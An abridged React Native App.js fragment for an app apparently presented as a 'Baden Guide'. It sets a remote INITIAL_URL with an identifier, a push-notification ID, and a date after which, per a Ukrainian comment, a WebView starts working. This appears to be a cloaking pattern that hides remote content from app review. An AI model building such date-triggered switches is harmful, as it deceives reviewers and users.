...
import BadenGuideProdScr from './src/screens/BadenGuideProdScr';
...
const App = () => {
      ...
      const INITIAL_URL = `https://exceptional-legendary-radiance.space/`;
      const URL_IDENTIFAIRE = `85QnpNMW`;
      ...
      OneSignal.initialize('9792d9d1-7f33-45ed-a572-50a409fc505b');
      ...
      useEffect(() => {
            ...
            const targetData = new Date('2025-04-15T13:00:00'); //дата з якої поч працювати webView
                  ...
                  return (
                        <Stack.Navigator>
                              <Stack.Screen
                                    ...
                                    name="BadenGuideProdScr"
                                    component={BadenGuideProdScr}
            ...
            <NavigationContainer>
                  {!louderIsEnded || !aceptTransperency || !completeLink ? (
                        <View
                              ...
                              <Animated.Image
                                    source={require('./src/assets/newDiz/1.jpg')}
                                    style={{
                                          //...props.style,
                              ...
                              />
                              <Animated.Image
                                    source={require('./src/assets/newDiz/2.jpg')}
                                    style={{
                                          //...props.style,
